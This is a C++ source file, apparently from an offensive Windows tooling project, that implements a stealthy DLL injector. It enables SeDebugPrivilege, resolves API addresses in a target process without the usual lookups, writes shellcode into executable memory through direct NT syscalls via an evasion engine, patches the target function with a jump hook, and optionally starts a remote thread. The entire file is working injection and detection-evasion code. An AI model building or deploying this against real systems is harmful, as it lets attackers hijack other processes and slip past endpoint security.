#include "injector.h"
#include "shell.h"
#include "config.h"

#include <windows.h>
#include <cstdio>
#include <string>
#include <vector>
#include <tlhelp32.h>
#include <shlwapi.h>
#include "../extern/ActiveBreach-Engine/C++/Include/ActiveBreach.hpp"

#pragma comment(lib, "Shlwapi.lib")

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtReadVirtualMemory_t)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* NtClose_t)(HANDLE);

static bool EnableSeDebugPrivilege();
static std::string ResolveDllPath(const char* dllName);
static std::string FindSystemDllPath(const char* dllName);
static bool WriteHook(HANDLE hProc, PVOID hookAddr, PVOID remoteCode, SIZE_T hookSize, ULONG& oldProt);

// Find base address of a module in remote process (UNICODE, case-insensitive)
uintptr_t GetRemoteModuleBase(DWORD pid, const char* moduleName) {
    wchar_t wModuleName[MAX_PATH] = { 0 };
    MultiByteToWideChar(CP_ACP, 0, moduleName, -1, wModuleName, MAX_PATH);

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    MODULEENTRY32W me = { sizeof(me) };
    uintptr_t result = 0;
    if (Module32FirstW(hSnap, &me)) {
        do {
            if (_wcsicmp(me.szModule, wModuleName) == 0) {
                result = (uintptr_t)me.modBaseAddr;
                break;
            }
        } while (Module32NextW(hSnap, &me));
    }
    CloseHandle(hSnap);
    return result;
}

// Get RVA of export from DLL on disk
uintptr_t FindExportRVA(const char* dllPath, const char* exportName) {
    HMODULE hMod = LoadLibraryExA(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hMod) return 0;
    auto base = (BYTE*)hMod;
    auto dos = (IMAGE_DOS_HEADER*)base;
    auto nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto ed = (IMAGE_EXPORT_DIRECTORY*)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)(base + ed->AddressOfNames);
    WORD* ords = (WORD*)(base + ed->AddressOfNameOrdinals);
    DWORD* addrs = (DWORD*)(base + ed->AddressOfFunctions);
    for (DWORD i = 0; i < ed->NumberOfNames; ++i) {
        const char* n = (const char*)base + names[i];
        if (_stricmp(n, exportName) == 0) {
            WORD ord = ords[i];
            DWORD rva = addrs[ord];
            FreeLibrary(hMod);
            return rva;
        }
    }
    FreeLibrary(hMod);
    return 0;
}

// Stealth resolver that works for both system DLLs and local DLLs
PVOID StealthResolveRemoteProc(DWORD pid, const char* dllName, const char* apiName) {
    uintptr_t remoteBase = GetRemoteModuleBase(pid, dllName);
    if (!remoteBase) {
        printf("Remote module %s not found in pid %lu\n", dllName, pid);
        return nullptr;
    }

    // Decide correct local path: system DLL or next to EXE
    std::string localPath;
    if (_stricmp(dllName, "kernel32.dll") == 0 ||
        _stricmp(dllName, "user32.dll") == 0 ||
        _stricmp(dllName, "ntdll.dll") == 0 ||
        _stricmp(dllName, "advapi32.dll") == 0 ||
        _stricmp(dllName, "gdi32.dll") == 0) {
        localPath = FindSystemDllPath(dllName);
    }
    else {
        localPath = ResolveDllPath(dllName);
    }

    if (localPath.empty()) {
        printf("Could not resolve %s locally\n", dllName);
        return nullptr;
    }
    uintptr_t rva = FindExportRVA(localPath.c_str(), apiName);
    if (!rva) {
        printf("Export %s not found in %s\n", apiName, localPath.c_str());
        return nullptr;
    }
    return (PVOID)(remoteBase + rva);
}

bool InjectDll(DWORD pid, const char* targetDll, const char* targetApi, const char* dllPathInput) {
    if (_AbViolationCount()) {
        printf("ActiveBreach violations: %u\n", _AbViolationCount());
        return false;
    }
    if (!EnableSeDebugPrivilege()) {
        printf("SeDebugPrivilege failed\n");
        return false;
    }
    std::string dllPath = ResolveDllPath(dllPathInput);
    if (dllPath.empty()) {
        printf("Could not resolve %s\n", dllPathInput);
        return false;
    }

    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc) {
        printf("OpenProcess failed: %lu\n", GetLastError());
        return false;
    }

    // Stealth API resolver (no GetProcAddress/GetModuleHandle)
    PVOID hookAddr = StealthResolveRemoteProc(pid, targetDll, targetApi);
    if (!hookAddr) {
        CloseHandle(hProc);
        return false;
    }
    printf("Resolved remote hook address: %p (%s!%s)\n", hookAddr, targetDll, targetApi);

    // Read original bytes
    const SIZE_T hookSize = 12;
    BYTE orig[hookSize] = { 0 };
    ULONG bytesRead = 0;
    NTSTATUS st = ab_call(
        NtReadVirtualMemory_t,
        "NtReadVirtualMemory",
        hProc,
        hookAddr,
        orig,
        (ULONG)hookSize,
        &bytesRead
    );
    if (!NT_SUCCESS(st) || bytesRead != hookSize) {
        DBGPRINT("NtReadVirtualMemory failed at %p: 0x%X (bytesRead=%lu)",
            hookAddr, st, bytesRead);
        CloseHandle(hProc);
        return false;
    }
    DBGPRINT("Read %lu bytes from %p", bytesRead, hookAddr);

    // Allocate memory for DLL path
    PVOID remotePath = nullptr;
    SIZE_T pathLen = dllPath.size() + 1;
    st = ab_call(NtAllocateVirtualMemory_t, "NtAllocateVirtualMemory", hProc, &remotePath, 0, &pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        CloseHandle(hProc);
        return false;
    }
    st = ab_call(NtWriteVirtualMemory_t, "NtWriteVirtualMemory", hProc, remotePath, (PVOID)dllPath.c_str(), (ULONG)pathLen, nullptr);
    if (!NT_SUCCESS(st)) {
        CloseHandle(hProc);
        return false;
    }

    // Allocate shellcode
    PVOID remoteCode = nullptr;
    SIZE_T codeSize = 1024;
    st = ab_call(NtAllocateVirtualMemory_t, "NtAllocateVirtualMemory", hProc, &remoteCode, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(st)) {
        CloseHandle(hProc);
        return false;
    }

    // Generate shellcode
    std::vector<BYTE> shell = GenerateShellcode(hookAddr, remotePath, remoteCode, orig, hookSize, true);
    st = ab_call(NtWriteVirtualMemory_t, "NtWriteVirtualMemory", hProc, remoteCode, shell.data(), (ULONG)shell.size(), nullptr);
    if (!NT_SUCCESS(st)) {
        CloseHandle(hProc);
        return false;
    }

    // Write the hook
    ULONG oldProt = 0;
    if (!WriteHook(hProc, hookAddr, remoteCode, hookSize, oldProt)) {
        CloseHandle(hProc);
        return false;
    }

#if CR_REMOTE_THREAD_EXECUTION
    // Inject test thread to call the hooked API
    HANDLE hThread = NULL;
    st = ab_call(NtCreateThreadEx_t, "NtCreateThreadEx", &hThread, THREAD_ALL_ACCESS, NULL, hProc, hookAddr, (PVOID)0, 0, 0, 0, 0, NULL);
    if (NT_SUCCESS(st)) {
        printf("Test thread created to call target API\n");
        WaitForSingleObject(hThread, 10000);
        ab_call(NtClose_t, "NtClose", hThread);
    }
    else {
        printf("NtCreateThreadEx failed: 0x%X\n", st);
    }
#else
    printf("No test thread created (CR_REMOTE_THREAD_EXECUTION = 0). Interact with the process to trigger the hook.\n");
#endif

    printf("Injection complete.\n");
    CloseHandle(hProc);
    return true;
}

// Elevate to SE_DEBUG privilege
static bool EnableSeDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken failed: %lu\n", GetLastError());
        return false;
    }
    LUID luid;
    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid)) {
        printf("LookupPrivilegeValue failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return false;
    }
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)) {
        printf("AdjustTokenPrivileges API failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return false;
    }
    DWORD err = GetLastError();
    CloseHandle(hToken);
    if (err == ERROR_NOT_ALL_ASSIGNED) {
        printf("SeDebugPrivilege not held by this account.\n");
        return false;
    }
    if (err != ERROR_SUCCESS) {
        printf("AdjustTokenPrivileges error: %lu\n", err);
        return false;
    }
    printf("SeDebugPrivilege enabled.\n");
    return true;
}

// Find DLL next to our EXE
static std::string ResolveDllPath(const char* dllName) {
    char buf[MAX_PATH];
    if (!GetModuleFileNameA(nullptr, buf, MAX_PATH))
        return "";
    PathRemoveFileSpecA(buf);
    return std::string(buf) + "\\" + dllName;
}

// Find system DLL in Windows\System32
static std::string FindSystemDllPath(const char* dllName) {
    char sysdir[MAX_PATH];
    GetSystemDirectoryA(sysdir, MAX_PATH);
    std::string path = std::string(sysdir) + "\\" + dllName;
    return path;
}

// Install the code cave/hook
static bool WriteHook(HANDLE hProc, PVOID hookAddr, PVOID remoteCode, SIZE_T hookSize, ULONG& oldProt) {
    NTSTATUS st;
    SIZE_T sz = hookSize;
    PVOID addr = hookAddr;
    st = ab_call(NtProtectVirtualMemory_t, "NtProtectVirtualMemory", hProc, &addr, &sz, PAGE_EXECUTE_READWRITE, &oldProt);
    if (!NT_SUCCESS(st)) {
        printf("NtProtectVirtualMemory (RWX) failed: 0x%X\n", st);
        return false;
    }
    BYTE hook[12] = { 0x48,0xB8,0,0,0,0,0,0,0,0,0xFF,0xE0 };
    memcpy(hook + 2, &remoteCode, sizeof(remoteCode));
    st = ab_call(NtWriteVirtualMemory_t, "NtWriteVirtualMemory", hProc, hookAddr, hook, (ULONG)hookSize, nullptr);
    if (!NT_SUCCESS(st)) {
        printf("NtWriteVirtualMemory (hook) failed: 0x%X\n", st);
        return false;
    }
    st = ab_call(NtProtectVirtualMemory_t, "NtProtectVirtualMemory", hProc, &addr, &sz, oldProt, &oldProt);
    if (!NT_SUCCESS(st)) {
        printf("NtProtectVirtualMemory (restore) failed: 0x%X\n", st);
        return false;
    }
    return true;
}
